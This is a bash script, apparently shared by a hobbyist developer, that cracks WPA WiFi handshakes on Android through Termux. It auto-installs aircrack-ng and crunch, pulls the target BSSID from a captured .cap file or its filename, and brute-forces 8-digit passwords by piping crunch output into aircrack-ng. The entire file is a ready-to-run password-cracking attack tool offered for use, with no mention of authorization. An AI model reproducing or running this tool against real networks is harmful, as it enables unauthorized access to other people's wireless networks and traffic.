#!/bin/bash

# =============================================================================
# WiFi Handshake Cracker Tool - Termux Version
# Developer: Aissa Abk
# Version: 2.2 - Termux Compatible
# GitHub: www.github.aissaabk
# Facebook: www.facebook.com/devbelmel
# =============================================================================

show_help() {
    echo "================================================================"
    echo "           WiFi Handshake Cracker - Termux Version"
    echo "================================================================"
    echo ""
    echo "📖 ABOUT:"
    echo "  Crack WiFi handshakes on Android using Termux"
    echo "  Works with .cap files from various capture tools"
    echo ""
    echo "👨‍💻 DEVELOPER:"
    echo "  Aissa Abk"
    echo "  GitHub:   www.github.aissaabk"
    echo "  Facebook: www.facebook.com/devbelmel"
    echo ""
    echo "⚡ USAGE:"
    echo "  $0 <handshake.cap>"
    echo "  $0 --help"
    echo "  $0 --termux-setup"
    echo ""
    echo "🔧 TERMUX INSTALLATION:"
    echo "  pkg update && pkg upgrade"
    echo "  pkg install aircrack-ng crunch binutils"
    echo ""
    echo "================================================================"
}

termux_setup() {
    echo "================================================================"
    echo "                Termux Setup Guide"
    echo "================================================================"
    echo ""
    echo "📥 INSTALLATION COMMANDS:"
    echo ""
    echo "1. Update Termux:"
    echo "   pkg update && pkg upgrade"
    echo ""
    echo "2. Install required tools:"
    echo "   pkg install root-repo"
    echo "   pkg install aircrack-ng crunch binutils"
    echo ""
    echo "3. Alternative method:"
    echo "   pkg install unstable-repo"
    echo "   pkg install aircrack-ng"
    echo ""
    echo "4. Verify installation:"
    echo "   aircrack-ng --version"
    echo "   crunch"
    echo ""
    echo "⚠️  NOTES:"
    echo "   - Requires Android 7.0+"
    echo "   - Needs storage permission: termux-setup-storage"
    echo "   - Works best with root access"
    echo ""
    echo "================================================================"
}

# Function to check and install required tools in Termux
check_and_install_tools() {
    local missing_tools=()
    
    # Check for required tools
    for tool in strings crunch aircrack-ng; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    # If no missing tools, return
    if [ ${#missing_tools[@]} -eq 0 ]; then
        echo "✅ All required tools are installed"
        return 0
    fi
    
    echo "🔧 Missing tools: ${missing_tools[*]}"
    
    # Check if we're in Termux
    if [ -n "$TERMUX_VERSION" ] || [ -d "$PREFIX" ] && [ -d "/data/data/com.termux" ]; then
        echo "📱 Termux environment detected"
        echo "📥 Attempting to install missing tools..."
        
        # Check internet connectivity
        if ping -c 1 -W 3 8.8.8.8 &> /dev/null; then
            echo "🌐 Network connected. Installing tools..."
            
            # Update packages
            pkg update -y > /dev/null 2>&1
            
            for tool in "${missing_tools[@]}"; do
                case $tool in
                    strings)
                        echo "📥 Installing binutils..."
                        pkg install -y binutils > /dev/null 2>&1
                        ;;
                    crunch)
                        echo "📥 Installing crunch..."
                        pkg install -y crunch > /dev/null 2>&1
                        ;;
                    aircrack-ng)
                        echo "📥 Installing aircrack-ng..."
                        pkg install -y root-repo > /dev/null 2>&1
                        pkg install -y aircrack-ng > /dev/null 2>&1
                        ;;
                esac
            done
            
            # Verify installation
            local failed_tools=()
            for tool in "${missing_tools[@]}"; do
                if command -v "$tool" &> /dev/null; then
                    echo "✅ $tool installed successfully"
                else
                    echo "❌ Failed to install $tool"
                    failed_tools+=("$tool")
                fi
            done
            
            if [ ${#failed_tools[@]} -eq 0 ]; then
                return 0
            else
                echo "❌ Some tools failed to install: ${failed_tools[*]}"
                echo "💡 Try manual installation: pkg install ${failed_tools[*]}"
                return 1
            fi
        else
            echo "🌐 No network connection. Skipping automatic installation."
            echo "💡 Run: pkg install ${missing_tools[*]}"
            return 1
        fi
    else
        echo "❌ Not in Termux environment. Please install tools manually."
        return 1
    fi
}

# Function to extract from cap file content
extract_from_cap_content() {
    local file="$1"
    local bssid=""
    local essid=""
    
    echo "🔍 Analyzing cap file content..."
    
    # Try multiple methods to extract BSSID from cap file
    if command -v strings &> /dev/null; then
        # Method 1: Use strings to find MAC addresses
        bssid=$(strings "$file" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | head -1)
        
        # Method 2: If first method fails, try alternative patterns
        if [ -z "$bssid" ]; then
            bssid=$(strings "$file" | grep -oE '([[:xdigit:]]{1,2}[:-]){5}[[:xdigit:]]{1,2}' | head -1 | sed 's/-/:/g')
        fi
        
        # Extract ESSID
        essid=$(strings "$file" | grep -E '^[A-Za-z0-9_-]{1,32}$' | head -1)
    fi
    
    # Method 3: Try hexdump if strings didn't work
    if [ -z "$bssid" ] && command -v hexdump &> /dev/null; then
        bssid=$(hexdump -C "$file" 2>/dev/null | grep -E '([0-9a-f]{2}[:-]){5}[0-9a-f]{2}' | head -1 | grep -oE '([0-9a-f]{2}[:-]){5}[0-9a-f]{2}' | head -1 | sed 's/-/:/g')
    fi
    
    # Return results
    if [ -n "$bssid" ]; then
        echo "$bssid|$essid"
        return 0
    else
        return 1
    fi
}

# Function to extract from filename (fallback method)
extract_from_filename() {
    local filename="$1"
    local bssid=""
    local mac=""
    local timestamp=""
    
    echo "📁 Extracting from filename..."
    
    # Extract BSSID-like middle identifier
    bssid=$(echo "$filename" | cut -d "_" -f 2)

    # Extract MAC address (convert - to :)
    mac=$(echo "$filename" \
          | grep -oE '[A-Fa-f0-9]{2}(-[A-Fa-f0-9]{2}){5}' \
          | head -1 \
          | sed 's/-/:/g')

    # Extract timestamp
    timestamp=$(echo "$filename" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9-]{8}')

    # If we got MAC but no BSSID, use MAC as BSSID
    if [ -z "$bssid" ] && [ -n "$mac" ]; then
        bssid="$mac"
    fi
    
    # If we got BSSID but no MAC, use BSSID as MAC
    if [ -n "$bssid" ] && [ -z "$mac" ]; then
        mac="$bssid"
    fi
    
    echo "$bssid|$mac|$timestamp"
}

# =============================================================================
# MAIN SCRIPT START
# =============================================================================

# Handle command line arguments
case "${1:-}" in
    -h|--help|help)
        show_help
        exit 0
        ;;
    --termux-setup|setup)
        termux_setup
        exit 0
        ;;
    "")
        show_help
        exit 1
        ;;
    *)
        # Normal execution with .cap file
        ;;
esac

# Check if file exists
if [ ! -f "$1" ]; then
    echo "❌ Error: File '$1' not found!"
    echo "💡 Usage: $0 <handshake.cap>"
    exit 1
fi

FILEPATH=$(realpath "$1" 2>/dev/null || echo "$1")
FILENAME=$(basename "$FILEPATH")

echo "================================================================"
echo "           WiFi Handshake Cracker - Termux Version"
echo "================================================================"
echo "👨‍💻 Developer: Aissa Abk"
echo "🌐 GitHub: www.github.aissaabk"
echo ""
echo "📁 File: $FILENAME"
echo "📍 Path: $FILEPATH"
echo ""

# Check and install tools
check_and_install_tools

# --------------------------------------------------------------------
# Main extraction logic
# --------------------------------------------------------------------
echo "🔍 Analyzing file to extract network information..."

# First try to extract from cap file content
if result=$(extract_from_cap_content "$FILEPATH"); then
    echo "✅ Successfully extracted from cap file content"
    BSSID=$(echo "$result" | cut -d "|" -f 1)
    ESSID=$(echo "$result" | cut -d "|" -f 2)
    MAC="$BSSID"
    EXTRACTION_METHOD="cap_file_content"
else
    # Fallback to filename parsing
    echo "⚠ Could not extract from cap file content, trying filename..."
    result=$(extract_from_filename "$FILENAME")
    BSSID=$(echo "$result" | cut -d "|" -f 1)
    MAC=$(echo "$result" | cut -d "|" -f 2)
    TIMESTAMP=$(echo "$result" | cut -d "|" -f 3)
    EXTRACTION_METHOD="filename"
fi

# Final validation - if still no BSSID/MAC, ask user
if [ -z "$BSSID" ] || [ -z "$MAC" ]; then
    echo "❌ Could not automatically extract BSSID/MAC"
    echo "Please enter the target information manually:"
    read -p "BSSID/MAC address: " BSSID
    MAC="$BSSID"
    EXTRACTION_METHOD="manual"
fi

# Clean up MAC address format
BSSID=$(echo "$BSSID" | sed 's/-/:/g' | tr '[:lower:]' '[:upper:]')
MAC=$(echo "$MAC" | sed 's/-/:/g' | tr '[:lower:]' '[:upper:]')

# --------------------------------------------------------------------
# Display extracted information
# --------------------------------------------------------------------
echo ""
echo "=== Extracted Information ==="
echo "Extraction method: $EXTRACTION_METHOD"
echo "BSSID:            $BSSID"
echo "MAC Address:      $MAC"
if [ -n "$ESSID" ]; then
    echo "Network ESSID:    $ESSID"
fi
if [ -n "$TIMESTAMP" ]; then
    echo "Timestamp:        $TIMESTAMP"
fi
echo ""

# --------------------------------------------------------------------
# Generate parameters optimized for mobile
# --------------------------------------------------------------------
TOOLS_ARG1="8"
TOOLS_ARG2="8"
TOOLS_ARG3="%%%%%%%%"

echo "Generated parameters (mobile optimized):"
echo "Min length: $TOOLS_ARG1"
echo "Max length: $TOOLS_ARG2"
echo "Pattern:    $TOOLS_ARG3"
echo ""

# Simple parameter selection for mobile
echo "=== Quick Start ==="
echo "1) Start cracking with default settings"
echo "2) Custom settings"
echo "x) Exit"
read -p "Choose: " CHOICE

case "$CHOICE" in
    1)
        ARG1="$TOOLS_ARG1"
        ARG2="$TOOLS_ARG2"
        ARG3="$TOOLS_ARG3"
        ;;
    2)
        read -p "Min length (8): " ARG1
        read -p "Max length (8): " ARG2
        read -p "Pattern (%%%%): " ARG3
        ARG1=${ARG1:-8}
        ARG2=${ARG2:-8}
        ARG3=${ARG3:-"%%%%"}
        ;;
    x|X)
        echo "Exiting."
        exit 0
        ;;
    *)
        echo "Using default settings"
        ARG1="$TOOLS_ARG1"
        ARG2="$TOOLS_ARG2"
        ARG3="$TOOLS_ARG3"
        ;;
esac

# --------------------------------------------------------------------
# Final command execution
# --------------------------------------------------------------------
echo ""
echo "🎯 Final command:"
echo "crunch $ARG1 $ARG2 -t \"$ARG3\" --stdout | aircrack-ng -w- -b \"$MAC\" \"$FILEPATH\""
echo ""

# Final tool check
if ! command -v crunch &> /dev/null; then
    echo "❌ Error: crunch not found. Install with: pkg install crunch"
    exit 1
fi

if ! command -v aircrack-ng &> /dev/null; then
    echo "❌ Error: aircrack-ng not found. Install with: pkg install aircrack-ng"
    exit 1
fi

echo "⚠️  Note: Cracking on mobile may be slower than on PC"
read -p "Start cracking? (y/n): " CONFIRM

if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
    echo "🚀 Starting attack on Termux..."
    echo "⏳ This may take a while on mobile device..."
    echo ""
    crunch $ARG1 $ARG2 -t "$ARG3" --stdout | aircrack-ng -w- -b "$MAC" "$FILEPATH"
else
    echo "❌ Cancelled."
fi

echo ""
echo "================================================================"
echo "💝 Support the developer!"
echo "🌐 GitHub: www.github.aissaabk"
echo "📘 Facebook: www.facebook.com/devbelmel"
echo "================================================================"